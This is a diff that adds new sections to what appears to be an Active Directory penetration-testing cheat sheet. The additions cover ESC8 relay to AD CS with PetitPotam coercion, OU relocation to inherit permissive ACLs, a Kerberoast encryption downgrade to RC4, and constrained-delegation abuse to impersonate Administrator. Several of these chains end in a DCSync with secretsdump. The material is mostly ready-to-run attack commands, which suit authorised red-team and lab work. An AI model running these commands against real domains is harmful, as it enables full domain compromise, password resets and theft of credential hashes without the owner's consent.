@@ -119,6 +119,15 @@ certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -retr
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
+ESC8 (AD CS Web Enrollment reachable over HTTP, no Extended Protection for Authentication) — relay any coerced machine-account auth into a cert request, no template misconfig needed:
+```bash
+certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -scheme ldap -vulnerable   # look for "ESC8": "Web Enrollment is enabled..."
+certipy relay -target 'http://<CA_HOST>' -template DomainController &
+petitpotam.py -u <USER> -p '<PASS>' <LISTENER_IP> <DC_IP>          # coerces the DC machine account to auth to your relay
+certipy auth -pfx <dc-host>.pfx -dc-ip <DC_IP>                     # -> DC$ machine account NT hash
+secretsdump.py '<domain>/<dc-host>$'@<DC_FQDN> -hashes :<HASH>     # DCSync
+```
+
 Backup Operators group membership — this group can remotely dump SAM/SYSTEM registry hives without ever getting an interactive session:
 ```bash
 nxc smb <target> -u <USER> -H '<hash>' -M backup_operator    # drives the remote backup+download for you
@@ -154,5 +163,29 @@ Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SN
 ```bash
 nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
 hashcat --username -a0 -m31300 hashes.txt <WORDLIST>   # mode needs a recent hashcat (7.x); older builds lack it
+```
+
+Object relocation across OUs — if you can write `distinguishedName` on an object, moving it into a more permissive OU makes it inherit that OU's ACL (useful when one tier/OU has a stray `GenericAll`+inherit ACE the others don't):
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -k set object '<CN=target,OU=restrictive-OU,...>' distinguishedName -v '<CN=target,OU=permissive-OU,...>'
+bloodyAD --host <DC_FQDN> -d <domain> -k set password <target> '<newpass>'   # now inherited GenericAll lets this through
+```
+
+Kerberoast encryption downgrade — if `targetedKerberoast` only returns an AES ticket (etype 18, uncrackable without the plaintext), and you hold write on the target's `msDS-SupportedEncryptionTypes`, force RC4 instead of patching Impacket:
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -k set object <TARGET_USER> msDS-SupportedEncryptionTypes -v 4   # 4 = RC4 only
+targetedKerberoast.py -k --dc-host <DC_FQDN> -d <domain> -u <USER> --request-user <TARGET_USER>   # now $krb5tgs$23$ (RC4)
+hashcat -m13100 -a0 hash.txt <WORDLIST>
+```
+
+Constrained delegation with protocol transition abuse — if you can set `msDS-AllowedToDelegateTo` and the `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC flag on an account you control (e.g. via prior `GenericAll`/`GenericWrite`), it can request a ticket to any service *as anyone*, including Administrator (S4U2Self + S4U2Proxy, no target password needed):
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -k set object '<CONTROLLED_ACCT>' msDS-AllowedToDelegateTo -v '<spn, e.g. ldap/DC_FQDN>'
+bloodyAD --host <DC_FQDN> -d <domain> -k add uac '<CONTROLLED_ACCT>' -f TRUSTED_TO_AUTH_FOR_DELEGATION
+getTGT.py '<domain>/<CONTROLLED_ACCT>:<PASS>'
+export KRB5CCNAME=<CONTROLLED_ACCT>.ccache
+getST.py '<domain>/<CONTROLLED_ACCT>' -spn <same-spn> -impersonate Administrator -k -no-pass -dc-ip <DC_IP>
+export KRB5CCNAME=Administrator@<spn-with-underscores>@<REALM>.ccache
+secretsdump.py -k -no-pass <DC_FQDN>                 # DCSync as impersonated Administrator
 ```
 
